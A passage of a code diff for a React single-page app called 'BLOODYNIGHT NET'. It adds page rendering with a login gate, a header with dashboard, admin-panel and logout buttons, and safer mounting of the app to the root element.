+        // which will then trigger the useEffect above to set the correct page.
+        // No explicit page setting needed here.
+    };
+
+    const renderPage = () => {
+        if (loading) {
+            return React.createElement('div', { className: 'min-h-screen flex items-center justify-center text-gray-300 text-xl' }, 'LOADING...');
+        }
+
+        if (!user) {
+            return React.createElement(Auth, { onAuthSuccess: handleAuthSuccess });
+        }
+
+        // Render Header Bar
+        const headerBar = React.createElement('header', { className: 'header-bar' },
+            React.createElement('div', { className: 'site-title' }, 'BLOODYNIGHT NET'),
+            React.createElement('nav', null,
+                React.createElement('button', {
+                    onClick: () => setCurrentPage('dashboard'),
+                    className: `nav-link ${currentPage === 'dashboard' ? 'active' : ''}`
+                }, 'DASHBOARD'),
+                user.isAdmin && React.createElement('button', {
+                    onClick: () => setCurrentPage('admin'),
+                    className: `nav-link ${currentPage === 'admin' ? 'active' : ''}`
+                }, 'ADMIN PANEL'),
+                React.createElement('button', { onClick: logout, className: 'btn-logout' }, 'LOGOUT')
+            )
+        );
+
+        // Render main content based on currentPage
+        let mainContent;
+        switch (currentPage) {
+            case 'dashboard':
+                mainContent = React.createElement(Dashboard, null);
+                break;
+            case 'admin':
+                mainContent = React.createElement(AdminPanel, null);
+                break;
+            default:
+                mainContent = React.createElement('div', { className: 'min-h-screen flex items-center justify-center text-gray-300 text-xl' }, 'PAGE NOT FOUND');
+        }
+
+        return React.createElement(React.Fragment, null, headerBar, mainContent);
+    };
+
+    return (
+        React.createElement(AuthProvider, null,
+            React.createElement(BackgroundDots, null),
+            renderPage()
+        )
+    );
+};
 // --- END: src/App.js ---
 
-// React DOM rendering
-const root = ReactDOM.createRoot(document.getElementById('root'));
-root.render(React.createElement(React.StrictMode, null, React.createElement(App, null)));
+// Mount the main App component to the DOM
+const rootElement = document.getElementById('root');
+
+if (rootElement) {
+    const root = ReactDOM.createRoot(rootElement);
+    root.render(
+        React.createElement(React.StrictMode, null,
+            React.createElement(App, null)
+        )
+    );
+    console.log("React application mounted successfully to #root.");
+} else {
+    console.error("Error: Root element with ID 'root' not found. React application cannot be mounted.");
+}
